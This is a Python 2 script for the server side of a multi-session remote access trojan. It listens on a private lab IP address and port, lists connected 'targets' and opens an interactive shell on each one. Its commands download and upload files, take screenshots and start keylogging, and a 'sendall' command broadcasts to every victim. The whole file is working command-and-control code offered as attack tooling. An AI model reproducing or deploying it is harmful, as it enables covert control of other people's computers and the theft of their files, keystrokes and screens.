#!/usr/bin/python

import socket
import os
import threading

count=0

def sendtoall(target, data):
        target.send(data)


def shell(target, ip):
        def reliable_send(data):
                target.send(data)

        def reliable_recv():
                data = ""
                while True:
                        try:
                                data = data + target.recv(1024).decode('utf-8')
                                return data
                        except ValueError:
                                continue
        def transfer(filename):
                name = filename + "/////"
                target.send(name)
                file = open(filename, "rb")
                send_data = file.read(1024)
                while send_data:
                     target.send(send_data)
                     send_data = file.read(1024)        

        def receive():
                SEPARATOR = "<SEPARATOR>"
                received = target.recv(4096).decode()
                filename, filesize = received.split(SEPARATOR)
                filename = os.path.basename(filename)
                filesize = int(filesize)
                file = open(filename, "wb")
                recv_data = target.recv(1024)
                while recv_data:
                     file.write(recv_data)
                     recv_data = target.recv(1024)
                

        global count
        while True:
                command = raw_input("* shell#-%s: " % str(ip))
                reliable_send(command)
                if command == 'q':
                        break
                elif command == 'exit':
                        target.close()
                        targets.remove(target)
                        ips.remove(ip)
                        break
                elif command[:2] == 'cd' and len(command) > 2:
                        result = reliable_recv()
                        print(result)
                        continue
                elif command[:8] == 'download':
                        receive()
                elif command[:6] == 'upload':
                        transfer(command[7:])
                elif command[:10] == 'screenshot':
                        receive()
                        val = reliable_recv()
                        print(val)
                elif command[:12] == 'keylog_start':
                        continue
                else:
                        result = reliable_recv()
                        print(result)
                        

def server():
        global clients
        while True:
                if stop_threads:
                        break
                s.settimeout(1)
                try:
                        target, ip = s.accept()
                        targets.append(target)
                        ips.append(ip)
                        print(str(targets[clients]) + "..." + str(ips[clients]) + " Has Connected! ")
                        clients += 1
                except:
                        pass


ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("10.0.2.5", 54321))
s.listen(5)

clients = 0
stop_threads = False

print("[+] Waiting For Targets To Connect ...")

t1 = threading.Thread(target=server)
t1.start()

while True:
        command = raw_input("* Center: ")
        if command == 'targets':
                count = 0
                for ip in ips:
                        print("Session " + str(count) + ". <---> " + str(ip))
                        count += 1
        elif command[:7] == 'session':
                try:
                        num = int(command[8:])
                        tarnum = targets[num]
                        tarip = ips[num]
                        shell(tarnum, tarip)
                except:
                        print("[!!] No Session Under That Number!")
        elif command == 'exit':
                for target in targets:
                        target.close()
                s.close()
                stop_threads = True
                t1.join()
                break
        elif command[:7] == 'sendall':
                length_of_targets = len(targets)
                i = 0
                try:
                        while i < length_of_targets:
                                tarnumber = targets[i]
                                print (tarnumber)
                                sendtoall(tarnumber, command)
                                i += 1
                except:
                        print("[!!] Failed To Send Command To All Targets!")
        else:
                print("[!!] Command Does't Exist!")


server()
